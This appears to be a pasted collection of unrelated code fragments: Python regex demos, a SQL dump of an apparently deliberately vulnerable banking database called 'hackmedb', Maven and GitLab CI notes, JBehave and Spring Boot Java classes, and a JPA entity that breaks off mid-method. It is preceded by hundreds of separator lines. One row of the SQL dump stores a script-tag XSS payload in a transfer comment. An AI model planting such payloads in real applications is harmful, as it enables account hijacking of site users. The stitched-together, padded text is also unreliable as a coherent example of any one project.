==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
import re

# EXAMPLE 1 - SEARCHING
patterns = ['term1', 'term2', 'term3']

text = 'This is a string with term2, but not the other term.'

for pattern in patterns:
    print(f'Searching for {pattern} in text')

    # pattern, text
    if re.search(pattern, text):
        print('Match was found\n')
    else:
        print('No match Found\n')

match = re.search('term2', text)
print(match)
print(type(match))


# EXAMPLE 2 - SPLITTING
email = 'rodrickwamala@gmail.com'

split_at = '@'

print(re.split(split_at, email))

# EXAMPLE 3 - FINDING
print(re.findall('rod', 'The email rodrickwamala@gmail.com belongs to the user wamala rodrick and has a username rodcalvin.'))
==============================================================================================================
-- phpMyAdmin SQL Dump
-- version 3.5.2
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Oct 20, 2012 at 06:03 PM
-- Server version: 5.5.25a
-- PHP Version: 5.4.4

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `hackmedb`
--

-- --------------------------------------------------------

--
-- Table structure for table `tblactivities`
--

CREATE TABLE IF NOT EXISTS `tblactivities` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'Activity ID',
  `from` int(11) NOT NULL COMMENT 'From ID',
  `to` int(11) NOT NULL COMMENT 'To ID',
  `amount` int(11) NOT NULL COMMENT 'Amount (Money)',
  `dateTime` datetime NOT NULL COMMENT 'Date And Time OF The Activity',
  `comment` text COMMENT 'Activity Comment',
  PRIMARY KEY (`id`),
  KEY `from` (`from`),
  KEY `to` (`to`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COMMENT='Activities Table - Purchase / Wire Transfers' AUTO_INCREMENT=37 ;

--
-- Dumping data for table `tblactivities`
--

INSERT INTO `tblactivities` (`id`, `from`, `to`, `amount`, `dateTime`, `comment`) VALUES
(1, 3, 11, 200, '2012-10-09 06:31:39', NULL),
(2, 10, 4, 300, '2012-09-04 08:34:39', NULL),
(3, 11, 3, 200, '2012-10-16 11:38:27', NULL),
(22, 4, 6, 1, '2012-10-18 06:34:49', NULL),
(23, 4, 9, 1, '2012-10-18 06:53:00', NULL),
(24, 9, 4, 325, '2012-10-18 06:55:51', NULL),
(25, 9, 4, 325, '2012-10-18 06:55:52', NULL),
(26, 9, 4, 325, '2012-10-18 06:55:52', NULL),
(27, 9, 4, 325, '2012-10-18 06:55:53', NULL),
(28, 9, 4, 325, '2012-10-18 06:55:53', NULL),
(29, 9, 4, 325, '2012-10-18 06:55:54', 'WTF WTF WTF IS THIS?'),
(30, 4, 3, 1, '2012-10-18 08:01:13', 'Please Look At My Profile.'),
(31, 6, 3, 1, '2012-10-18 08:01:31', '<script>\r\nalert("I Hacked Your Account With XSS Attack");\r\n</script>\r\nHello Man ;)'),
(32, 3, 4, 325, '2012-10-19 18:20:11', 'Bank Activities'),
(33, 3, 4, 325, '2012-10-19 18:20:33', 'Bank Activities'),
(34, 3, 4, 325, '2012-10-19 18:20:41', 'Bank Activities'),
(35, 3, 4, 325, '2012-10-19 18:20:58', 'Bank Activities'),
(36, 3, 4, 325, '2012-10-19 18:31:46', 'Bank Activities');

-----------------------------------------------------------
groupId:artifactId:type:classifier

https://maven.apache.org/plugins/maven-scm-publish-plugin/various-tips.html#Git_branch

mvn scm-publish:publish-scm -Dscmpublish.pubScmUrl=scm:<scm-provider>... -Dscmpublish.content=...path-to-content...
mvn site:stage
 
git clone --branch maven-scm-1.11.2 https://gitbox.apache.org/repos/asf/maven-scm.git
mvn release:prepare release:perform -B -Dusername=svnuid -Dpassword=svnpassword -DpreparationGoals="clean install"

mvn scm:status
mvn scm:bootstrap
mvn scm:bootstrap -N
mvn -DstartDate=YYYY-MM-DD -DendDate=YYYY-MM-DD scm:changelog
mvn scm:changelog


mvn scm:unedit
mvn scm:validate

mvn scm:status
mvn scm:edit
mvn scm:diff
mvn -DstartRevision=<revision> -DendRevision=<revision> scm:diff
mvn -Dtag="<tag name>" scm:tag
mvn -DscmConnection="<scm url>" -DscmDeveloperConnection="<scm url>" scm:validate
------------------------------------------------------------
    <build>
    <plugins>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-compiler-plugin</artifactId>
            <version>3.8.0</version>
            <configuration>
                <source>${java.version}</source>
                <target>${java.version}</target>
                <annotationProcessorPaths>
                    <path>
                        <groupId>org.projectlombok</groupId>
                        <artifactId>lombok</artifactId>
                        <version>${lombok.version}</version>
                    </path>
                </annotationProcessorPaths>
                <compilerArgs>
                    <arg>-sourcepath</arg>
                    <arg>${project.basedir}/src/main/java${path.separator}${project.basedir}/target/generated-sources/annotations${path.separator}/</arg>
                </compilerArgs>
            </configuration>
        </plugin>
    </plugins>
</build>

 <dependency>
        <groupId>org.projectlombok</groupId>
        <artifactId>lombok-maven-plugin</artifactId>
        <version>1.16.12.0</version>
    </dependency>
	
<dependency>
    <groupId>org.projectlombok</groupId>
    <artifactId>lombok-maven-plugin</artifactId>
    <version>1.18.10.0</version>
</dependency>

<plugin>
                <artifactId>maven-scm-plugin</artifactId>
                <version>1.9.5</version>
                <configuration>
                    <providerImplementations>
                        <svn>javasvn</svn>
                    </providerImplementations>
                    <connectionUrl>scm:svn:https://..</connectionUrl>
                    <username>user</username>
                    <password>XXX</password>
                </configuration>
                <dependencies>
                    <dependency>
                        <groupId>com.google.code.maven-scm-provider-svnjava</groupId>
                        <artifactId>maven-scm-provider-svnjava</artifactId>
                        <version>2.0.6</version>
                    </dependency>
                    <dependency>
                        <groupId>org.tmatesoft.svnkit</groupId>
                        <artifactId>svnkit</artifactId>
                        <version>1.7.11</version>
                    </dependency>
                </dependencies>
            </plugin>
To clone SVN repository: mvn -Djsse.enableSNIExtension=false scm:checkout

To update it: mvn scm:update
------------------------------------------------------------
Initial creation of the branch has to be done manually, as a Git orphan branch:

1. git checkout --orphan gh-pages to create the branch locally,

2. rm .git/index ; git clean -fdx to clean the branch content and let it empy,

3. copy an initial site content,

4. commit and push: git add *, git commit -m "initial site content", git push
------------------------------------------------------------
  before_script:
    - sed -i "s/GITLAB-CI-TOKEN/$CI_JOB_TOKEN/g" pom.xml
  script: mvn package 
  after_script:
    - sed -i "s/$CI_JOB_TOKEN/GITLAB-CI-TOKEN/g" pom.xml
------------------------------------------------------------
import org.jbehave.core.configuration.MostUsefulConfiguration;
import org.jbehave.core.io.LoadFromClasspath;
import org.jbehave.core.parsers.RegexPrefixCapturingPatternParser;
import org.jbehave.core.reporters.CrossReference;
import org.jbehave.core.steps.ParameterConverters;
import org.jbehave.core.steps.SilentStepMonitor;

import java.text.SimpleDateFormat;

public class TraderEmbedder extends Embedder {

    @Override
    public EmbedderControls embedderControls() {
        return new EmbedderControls().doIgnoreFailureInStories(true).doIgnoreFailureInView(true);
    }

    @Override
    public Configuration configuration() {
        Class<? extends TraderEmbedder> embedderClass = this.getClass();
        return new MostUsefulConfiguration()
            .useStoryLoader(new LoadFromClasspath(embedderClass.getClassLoader()))
            .useStoryReporterBuilder(new StoryReporterBuilder()
                .withCodeLocation(CodeLocations.codeLocationFromClass(embedderClass))
                .withDefaultFormats()
                .withFormats(CONSOLE, TXT, HTML, XML)
                .withCrossReference(new CrossReference()))
            .useParameterConverters(new ParameterConverters().addConverters(new DateConverter(new SimpleDateFormat("yyyy-MM-dd"))))
            .useStepPatternParser(new RegexPrefixCapturingPatternParser("$"))
            .useStepMonitor(new SilentStepMonitor());
    }

    @Override
    public InjectableStepsFactory stepsFactory() {
        return new InstanceStepsFactory(this.configuration(), new TraderSteps(new TradingService()), new BeforeAfterSteps());
    }
}

public class RemoteTraderStories extends TraderStories {
 
    @Override
    public Configuration configuration() {
        return super.configuration()
               .useStoryLoader(new LoadFromURL())
               .useStoryReporterBuilder(
                       new StoryReporterBuilder()
                           .withCodeLocation(codeLocationFromURL("http://jbehave.org/reference/examples/stories/"))
                           .withDefaultFormats()
                           .withFormats(CONSOLE, TXT, HTML, XML));
    }
 
    @Override
    protected List<String> storyPaths() {
        // Specify story paths as remote URLs
        String codeLocation = codeLocationFromURL("http://jbehave.org/reference/examples/stories/")
                .toExternalForm();
        return asList(codeLocation + "and_step.story");
    }
 
}
------------------------------------------------------------
ant -f jb_ant.xml -lib lib run-stories-as-paths

------------------------------------------------------------
            <!--<plugin>-->
            <!--<groupId>org.apache.maven.plugins</groupId>-->
            <!--<artifactId>maven-install-plugin</artifactId>-->
            <!--<version>${maven-install-plugin.version}</version>-->
            <!--<configuration>-->
            <!--<groupId>com.paragon.mailingcontour</groupId>-->
            <!--<artifactId>paragon.mailingcontour.commons</artifactId>-->
            <!--<version>${paragon.mailingcontour.commons.version}</version>-->
            <!--<classifier>tests</classifier>-->
            <!--<packaging>jar</packaging>-->
            <!--<file>${project.build.directory}/${project.artifactId}-${project.version}-tests.jar</file>-->
            <!--<generatePom>true</generatePom>-->
            <!--</configuration>-->
            <!--<executions>-->
            <!--<execution>-->
            <!--<id>install-jar-lib</id>-->
            <!--<goals>-->
            <!--<goal>install-file</goal>-->
            <!--</goals>-->
            <!--<phase>validate</phase>-->
            <!--</execution>-->
            <!--</executions>-->
            <!--</plugin>-->
------------------------------------------------------------
чтобы собрать надо иметь глобально установленную node-gyp и сделать

sudo node-gyp clean configure build

чтобы запустить надо сделать

npm start
------------------------------------------------------------
 * <pre class="code">
 * new SpringApplicationBuilder(Application.class).profiles(&quot;server&quot;)
 * 		.properties(&quot;transport=local&quot;).run(args);
 * </pre>
------------------------------------------------------------
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.context.web.SpringBootServletInitializer;

@SpringBootApplication
public class ZoApplication extends SpringBootServletInitializer {

	@Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
        return application.sources(ZoApplication.class);
    }
	
    public static void main(String[] args) {
        SpringApplication.run(ZoApplication.class);
    }
}
------------------------------------------------------------
import java.util.HashMap;
import java.util.Map;

import javax.persistence.CollectionTable;
import javax.persistence.Column;
import javax.persistence.ElementCollection;
import javax.persistence.Entity;
import javax.persistence.FetchType;
import javax.persistence.MapKeyColumn;
import javax.persistence.Table;
import javax.persistence.Transient;

import com.whenling.centralize.model.User;
import com.whenling.module.domain.model.SortEntity;

@Entity
@Table(name = "plugin_config")
public class PluginConfig extends SortEntity<User, Long> {

	private static final long serialVersionUID = 6374792677775419596L;

	/** 插件ID */
	@Column(nullable = false, updatable = false, unique = true, length = 100)
	private String pluginId;

	/** 是否启用 */
	@Column(nullable = false)
	private Boolean isEnabled;

	/** 属性 */
	@ElementCollection(fetch = FetchType.EAGER)
	@CollectionTable(name = "deal_plugin_config_attribute")
	@MapKeyColumn(name = "name", length = 100)
	private Map<String, String> attributes = new HashMap<String, String>();

	public String getPluginId() {
		return pluginId;
	}

	public void setPluginId(String pluginId) {
		this.pluginId = pluginId;
	}

	public Boolean getIsEnabled() {
		return isEnabled;
	}

	public void setIsEnabled(Boolean isEnabled) {
		this.isEnabled = isEnabled;
	}

	public Map<String, String> getAttributes() {
		return attributes;
	}

	public void setAttributes(Map<String, String> attributes) {
		this.attributes = attributes;
	}

	@Transient
	public String getAttribute(String name) {
		if (getAttributes() != null && name != null) {
			return getAttributes().get(name);
		} else {
			return null;
		}
	}

	@Transient
	public void setAttribute(String name, String value) {
		if (getAttributes() != null && name != null) {
